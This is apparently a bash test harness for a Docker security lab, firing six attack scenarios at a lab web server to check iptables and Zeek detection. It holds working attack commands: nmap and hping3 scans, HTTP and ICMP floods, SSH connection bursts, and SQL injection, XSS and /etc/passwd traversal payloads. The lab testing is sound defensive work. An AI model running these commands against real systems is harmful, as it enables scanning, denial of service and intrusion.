#!/bin/bash
################################################################################
# Attack Simulation Scripts for Security Testing
# Tests both Firewall (iptables) and Zeek IDS
################################################################################

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

cd "$PROJECT_DIR"

echo "=========================================="
echo "  Security Mechanism Testing Suite"
echo "  Firewall + Zeek Network Monitor"
echo "=========================================="
echo ""

# Configuration
TARGET_IP="172.25.0.3"      # Target web server (nginx)
TARGET_PORT="80"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Helper functions
print_status() {
    echo -e "${GREEN}[*]${NC} $1"
}

print_attack() {
    echo -e "${RED}[!]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[i]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[⚠]${NC} $1"
}

# Check if containers are running
check_prerequisites() {
    print_info "Checking prerequisites..."
    
    if ! docker ps | grep -q "target_web"; then
        print_warning "target_web container is not running!"
        echo "Please start with: docker compose up -d"
        exit 1
    fi
    
    if ! docker ps | grep -q "attacker"; then
        print_warning "attacker container is not running!"
        echo "Please start with: docker compose up -d"
        exit 1
    fi
    
    print_status "All prerequisites satisfied"
    echo ""
}

#------------------------------------------------------------
# SCENARIO 1: Network Scanning (Port Scan)
#------------------------------------------------------------
scenario_1_port_scan() {
    echo ""
    echo "=========================================="
    echo "SCENARIO 1: Network Scanning Attack"
    echo "=========================================="
    print_info "Objective: Enumerate open ports on target system"
    print_info "Expected Detection: Firewall logs + Zeek port scan alerts"
    echo ""
    
    print_attack "Launching Nmap SYN scan..."
    docker exec attacker bash -c "
        apt-get update -qq 2>/dev/null && apt-get install -y -qq nmap 2>/dev/null
        echo '→ Running SYN scan on ports 1-1000...'
        nmap -sS -p 1-1000 --max-retries 1 -T4 $TARGET_IP 2>/dev/null | head -20
        echo ''
        echo '→ Running NULL scan (stealth)...'
        nmap -sN -p 80,443,8080 $TARGET_IP 2>/dev/null | head -20
    " 2>/dev/null
    
    print_status "Port scan completed"
    print_info "Check: tail -f logs/firewall.log logs/zeek/notice.log"
    echo ""
    sleep 2
}

#------------------------------------------------------------
# SCENARIO 2: Denial of Service (HTTP Flood)
#------------------------------------------------------------
scenario_2_dos_attack() {
    echo ""
    echo "=========================================="
    echo "SCENARIO 2: HTTP Denial of Service"
    echo "=========================================="
    print_info "Objective: Overwhelm web server with rapid HTTP requests"
    print_info "Expected Detection: Firewall rate limiting + Zeek HTTP flood alerts"
    echo ""
    
    print_attack "Launching HTTP flood attack..."
    docker exec attacker bash -c "
        apt-get update -qq 2>/dev/null && apt-get install -y -qq apache2-utils curl 2>/dev/null
        echo '→ Sending 500 concurrent HTTP GET requests...'
        ab -n 500 -c 50 http://$TARGET_IP/ 2>/dev/null | grep -E 'Requests per second|Failed requests|Complete requests'
        echo ''
        echo '→ Sending rapid curl requests...'
        for i in {1..100}; do
            curl -s http://$TARGET_IP/ > /dev/null &
        done
        wait
        echo 'HTTP flood completed'
    " 2>/dev/null
    
    print_status "DoS attack completed"
    print_info "Check: grep 'HTTP_FLOOD\\|rate_limit' logs/firewall.log"
    echo ""
    sleep 2
}

#------------------------------------------------------------
# SCENARIO 3: SSH Brute Force
#------------------------------------------------------------
scenario_3_ssh_bruteforce() {
    echo ""
    echo "=========================================="
    echo "SCENARIO 3: SSH Brute Force Attack"
    echo "=========================================="
    print_info "Objective: Attempt multiple SSH authentication attempts"
    print_info "Expected Detection: Firewall blocks + Zeek SSH brute force alerts"
    echo ""
    
    print_attack "Simulating SSH brute force..."
    docker exec attacker bash -c "
        apt-get update -qq 2>/dev/null && apt-get install -y -qq netcat-traditional 2>/dev/null
        echo '→ Attempting SSH connections (will be blocked by firewall)...'
        for i in {1..20}; do
            nc -w 1 $TARGET_IP 22 2>/dev/null &
        done
        wait
        echo 'SSH brute force simulation completed'
    " 2>/dev/null
    
    print_status "SSH brute force test completed"
    print_info "Check: grep 'SSH_BLOCK\\|dst_port.*22' logs/firewall.log"
    echo ""
    sleep 2
}

#------------------------------------------------------------
# SCENARIO 4: ICMP Flood (Ping Flood)
#------------------------------------------------------------
scenario_4_icmp_flood() {
    echo ""
    echo "=========================================="
    echo "SCENARIO 4: ICMP Flood Attack"
    echo "=========================================="
    print_info "Objective: Send rapid ICMP echo requests"
    print_info "Expected Detection: Firewall rate limiting + Zeek ICMP flood alerts"
    echo ""
    
    print_attack "Launching ICMP flood..."
    
    docker exec attacker bash -c "
        echo '→ Sending rapid ICMP packets to target...'
        ping -c 100 -i 0.01 $TARGET_IP 2>/dev/null | tail -5
    " 2>/dev/null
    
    print_status "ICMP flood completed"
    print_info "Check: grep 'ICMP_FLOOD\\|rate_limit.*icmp' logs/firewall.log"
    echo ""
    sleep 2
}

#------------------------------------------------------------
# SCENARIO 5: Web Application Attacks (SQL Injection, XSS)
#------------------------------------------------------------
scenario_5_web_attack() {
    echo ""
    echo "=========================================="
    echo "SCENARIO 5: Web Application Attacks"
    echo "=========================================="
    print_info "Objective: Test for SQL injection, XSS, and directory traversal"
    print_info "Expected Detection: Zeek HTTP analysis and malicious pattern detection"
    echo ""
    
    print_attack "Launching web application attacks..."
    docker exec attacker bash -c "
        apt-get update -qq 2>/dev/null && apt-get install -y -qq curl 2>/dev/null
        
        echo '→ SQL Injection attempts...'
        curl -s 'http://$TARGET_IP/login?username=admin&password=1%27%20OR%20%271%27=%271' > /dev/null
        curl -s 'http://$TARGET_IP/search?q=1%27%20UNION%20SELECT%20NULL,NULL,NULL--' > /dev/null
        
        echo '→ XSS (Cross-Site Scripting) attempts...'
        curl -s 'http://$TARGET_IP/search?q=<script>alert(1)</script>' > /dev/null
        
        echo '→ Directory traversal attempts...'
        curl -s 'http://$TARGET_IP/page?file=../../../etc/passwd' > /dev/null
        
        echo 'Web attacks completed'
    " 2>/dev/null
    
    print_status "Web application attacks completed"
    print_info "Check: grep -E 'SQL_Injection|XSS|Directory_Traversal' logs/zeek/notice.log"
    echo ""
    sleep 2
}

#------------------------------------------------------------
# SCENARIO 6: Malformed Packets (TCP Flags Manipulation)
#------------------------------------------------------------
scenario_6_malformed_packets() {
    echo ""
    echo "=========================================="
    echo "SCENARIO 6: Malformed Packet Attack"
    echo "=========================================="
    print_info "Objective: Send TCP packets with unusual or invalid flags"
    print_info "Expected Detection: Firewall blocks malformed packets"
    echo ""
    
    print_attack "Sending malformed packets..."
    docker exec attacker bash -c "
        apt-get update -qq 2>/dev/null && apt-get install -y -qq hping3 2>/dev/null
        
        echo '→ TCP NULL scan (no flags set)...'
        hping3 -c 10 -p 80 $TARGET_IP 2>/dev/null &
        
        echo '→ TCP XMAS scan (FIN,PSH,URG flags)...'
        hping3 -F -P -U -c 10 -p 80 $TARGET_IP 2>/dev/null &
        
        echo '→ TCP FIN scan...'
        hping3 -F -c 10 -p 80 $TARGET_IP 2>/dev/null &
        
        wait
        echo 'Malformed packet tests completed'
    " 2>/dev/null
    
    print_status "Malformed packet tests completed"
    print_info "Check: grep -E 'TCP_NULL|TCP_XMAS|TCP_FIN' logs/firewall.log"
    echo ""
    sleep 2
}

#------------------------------------------------------------
# SCENARIO 7: Comprehensive Test (All Scenarios)
#------------------------------------------------------------
run_all_scenarios() {
    echo ""
    echo "=========================================="
    echo "  RUNNING ALL ATTACK SCENARIOS"
    echo "=========================================="
    echo ""
    print_warning "This will run all 6 attack scenarios sequentially"
    print_warning "Monitor logs in real-time in another terminal:"
    echo "  Terminal 1: tail -f logs/firewall.log"
    echo "  Terminal 2: tail -f logs/zeek/notice.log"
    echo ""
    read -p "Press ENTER to continue or Ctrl+C to cancel..."
    
    START_TIME=$(date +%s)
    
    scenario_1_port_scan
    sleep 3
    scenario_4_icmp_flood
    sleep 3
    scenario_2_dos_attack
    sleep 3
    scenario_5_web_attack
    sleep 3
    scenario_3_ssh_bruteforce
    sleep 3
    scenario_6_malformed_packets
    
    END_TIME=$(date +%s)
    DURATION=$((END_TIME - START_TIME))
    
    echo ""
    echo "=========================================="
    echo "  ALL SCENARIOS COMPLETED"
    echo "=========================================="
    print_status "Total execution time: ${DURATION} seconds"
    print_info "Review logs and Kibana dashboards for detections"
}

#------------------------------------------------------------
# Menu System
#------------------------------------------------------------
show_menu() {
    clear
    echo "=========================================="
    echo "  Attack Scenario Selection Menu"
    echo "=========================================="
    echo ""
    echo "Select an attack scenario to run:"
    echo ""
    echo "  1) Port Scanning (Nmap SYN/NULL scans)"
    echo "  2) HTTP Denial of Service (HTTP flood)"
    echo "  3) SSH Brute Force (connection attempts)"
    echo "  4) ICMP Flood (ping flood)"
    echo "  5) Web Application Attacks (SQLi, XSS, Directory Traversal)"
    echo "  6) Malformed Packets (TCP flag manipulation)"
    echo ""
    echo "  7) ★ Run ALL scenarios sequentially"
    echo ""
    echo "  0) Exit"
    echo ""
    echo "=========================================="
    read -p "Enter your choice [0-7]: " choice
    echo ""
    
    case $choice in
        1) scenario_1_port_scan; pause_and_return ;;
        2) scenario_2_dos_attack; pause_and_return ;;
        3) scenario_3_ssh_bruteforce; pause_and_return ;;
        4) scenario_4_icmp_flood; pause_and_return ;;
        5) scenario_5_web_attack; pause_and_return ;;
        6) scenario_6_malformed_packets; pause_and_return ;;
        7) run_all_scenarios; pause_and_return ;;
        0) exit 0 ;;
        *) echo "Invalid choice"; sleep 2; show_menu ;;
    esac
}

pause_and_return() {
    echo ""
    read -p "Press ENTER to return to menu..."
    show_menu
}

#------------------------------------------------------------
# Main Execution
#------------------------------------------------------------

# Check prerequisites
check_prerequisites

# Check if running with flags or show menu
if [ "$1" == "--all" ]; then
    run_all_scenarios
    exit 0
fi

if [[ "$1" =~ ^[1-6]$ ]]; then
    case $1 in
        1) scenario_1_port_scan ;;
        2) scenario_2_dos_attack ;;
        3) scenario_3_ssh_bruteforce ;;
        4) scenario_4_icmp_flood ;;
        5) scenario_5_web_attack ;;
        6) scenario_6_malformed_packets ;;
    esac
    exit 0
fi

# Show interactive menu
show_menu